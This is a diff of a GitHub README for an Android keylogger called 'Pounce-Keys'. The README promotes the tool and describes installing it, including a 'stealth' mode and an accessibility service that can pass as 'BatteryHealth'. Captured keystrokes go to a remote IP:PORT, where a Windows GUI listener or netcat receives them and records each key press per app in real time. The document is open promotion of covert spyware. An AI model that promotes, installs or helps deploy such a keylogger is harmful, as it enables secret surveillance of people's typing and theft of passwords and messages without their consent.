@@ -1,8 +1,7 @@
 ![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) ![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) ![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys) [![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com) ![GitHub Repo stars](https://img.shields.io/github/stars/kreabyte/pounce-keys?style=social)
 
 # Updated working filter, see release! 
-no more extra messages in other tabs, now only appends text from logs to respective app tab, my contact is currently in the java file for the listener
-if you would like to request a feature. this filter update was very hard work, please enjoy the update and check it out, night and day difference.
+
 
 ![2023-01-26-23-45-59](https://user-images.githubusercontent.com/28081004/215011657-baf35da7-4314-4528-a546-5d8de0e7b67f.gif)![2023-01-26-23-46-00](https://user-images.githubusercontent.com/28081004/215011715-c975098a-fec6-4a21-96cb-fb462e3d575f.gif)
 
@@ -72,16 +71,21 @@ stealth APK hash aab9a81cb74ee778cfdbbc1ff06d9fb4df04a03752cceb50afc3aee39e7aa5f
 
 # NORMAL INSTALL
 
-open the app and just place your IP:PORT and tap send (the ip of the device you will listen on, ie my java listener or netcat with -k switch)
+open the app and just place your IP:PORT and tap send (the ip of the device you will listen on)
 you may need to open settings/apps/app-name then tap 3 dots top right and allow special permissions
 make sure where you got the file from via web browser and or file manager has access,ES works if you have problems
 open accessibility settings and enable keylogger or BatteryHealth
 no manual fix.dat required
 
+# STEALTH
+
+![stealth_install](https://user-images.githubusercontent.com/28081004/215221291-f4a05ea5-448d-4b1d-ade3-8bec23c53a70.gif)
+
 
 
 # VIEWING LOGS
-![Screenshot 2023-01-25 001403](https://user-images.githubusercontent.com/28081004/214485413-54df17f6-7478-4d15-bbe0-da02d2d3618d.png)
+
+![Windows_Listener](https://user-images.githubusercontent.com/28081004/215221344-31ac118a-d505-41fe-acec-8301bdb0cedb.gif)
 
 new updated logger with gui, see and record each key press in real time (precise coded filters per app, will add more upon request or more traffic,
 coding this filter to not throw crap all over the place is hard, THATS WHY WE HAVE POUNCE-KEYS POUNCING ALL OVER THE PLACE.... I'll see myself out
@@ -122,7 +126,7 @@ check app folders in android for a key folder or a fix.dat file
 
 I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this here alone was worth it, I seen i got
 5 downloads and went to tidy this up a little bit I got so excited. Please leave a star if you like this project, would love to move up in the
-android-keylogger tag :) enjoy
+android-keylogger tag :) java listener is 1 of a kind, original content without forks.
 
 If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!
 
